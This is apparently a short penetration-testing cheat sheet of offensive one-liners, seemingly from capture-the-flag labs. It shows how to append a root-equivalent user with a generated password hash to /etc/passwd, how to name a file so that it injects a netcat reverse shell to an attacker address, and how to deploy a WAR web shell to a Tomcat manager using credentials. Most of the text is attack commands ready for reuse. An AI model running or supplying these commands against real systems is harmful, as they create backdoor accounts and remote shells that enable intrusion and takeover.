# Others
---

### Generating passwords to replace /etc/passwd:

mkpasswd
```bash
mkpasswd -m sha-256 -S cbbncbbn
```

```shell
cbbn:$5$cbbncbbn$hDpERmcSs2cHfAi37wrM5LYXUmqHOu.iKYAbFQmd4q.:0:0:root:/root:/bin/bash
```
 `cbbn:passw0rd123`

OpenSSL:
```bash
openssl passwd passw0rd123
Warning: truncating password to 8 characters
kW2ES4eAmzOLM

echo "n00b:kW2ES4eAmzOLM:0:0:root:/root:/bin/bash" >> /etc/passwd
```

-------------

Retrive erased media mounts:
```bash
cat /dev/sdb
```


Creating a file with the name as reverse shell:
```bash
touch -- ; nc 10.10.14.16 80 -e /bin/bash
```


Curl to upload a file:
```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/cbbnn" --upload-file shell1.war
```

$PATH variable
```bash
echo $PATH

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/root/.local/bin:$PATH
```


